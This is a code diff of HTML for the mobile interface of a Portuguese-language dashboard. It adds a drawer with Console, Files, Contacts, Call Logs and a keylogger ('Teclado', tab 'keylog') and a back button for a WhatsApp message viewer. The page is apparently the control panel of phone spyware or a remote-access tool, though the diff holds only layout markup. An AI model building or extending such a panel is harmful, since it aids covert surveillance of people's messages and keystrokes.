@@ -201,11 +201,40 @@
                     <i class="fa-brands fa-whatsapp"></i>
                     <span>Mensagens</span>
                 </button>
-                <button class="mbn-tab" data-tab="more" onclick="switchTab('more')">
+                <button class="mbn-tab" id="mbn-more" data-tab="more" onclick="openMoreDrawer()">
                     <i class="fa-solid fa-ellipsis"></i>
                     <span>Mais</span>
                 </button>
             </nav>
+
+            <!-- More drawer (mobile bottom sheet) -->
+            <div class="more-drawer-overlay" id="more-drawer-overlay" onclick="closeMoreDrawer()"></div>
+            <div class="more-drawer" id="more-drawer">
+                <div class="mdr-handle"></div>
+                <div class="mdr-title">Mais funções</div>
+                <div class="mdr-grid">
+                    <button class="mdr-item" onclick="mdrSelect('more')">
+                        <i class="fa-solid fa-terminal" style="color:#4f8ef7"></i>
+                        <span>Console</span>
+                    </button>
+                    <button class="mdr-item" onclick="mdrSelect('more')">
+                        <i class="fa-solid fa-folder-open" style="color:#f7b731"></i>
+                        <span>Arquivos</span>
+                    </button>
+                    <button class="mdr-item" onclick="mdrSelect('contacts')">
+                        <i class="fa-solid fa-address-book" style="color:#a29bfe"></i>
+                        <span>Contatos</span>
+                    </button>
+                    <button class="mdr-item" onclick="mdrSelect('calllogs')">
+                        <i class="fa-solid fa-phone-volume" style="color:#25d366"></i>
+                        <span>Ligações</span>
+                    </button>
+                    <button class="mdr-item" onclick="mdrSelect('keylog')">
+                        <i class="fa-solid fa-keyboard" style="color:#e17055"></i>
+                        <span>Teclado</span>
+                    </button>
+                </div>
+            </div>
 
             <!-- Dashboard Grid Layout -->
             <div class="dashboard-grid" id="dashboard-grid">
@@ -574,6 +603,9 @@
                             <!-- Chat pane: selected conversation -->
                             <div class="wa-chat-pane">
                                 <div class="wa-chat-header" id="wa-chat-header">
+                                    <button class="wa-back-btn" onclick="waBackToList()" aria-label="Voltar para conversas">
+                                        <i class="fa-solid fa-arrow-left"></i>
+                                    </button>
                                     <div class="wa-avatar" id="wa-avatar">?</div>
                                     <div class="wa-chat-info">
                                         <div class="wa-chat-name" id="wa-chat-name">Selecione uma conversa</div>
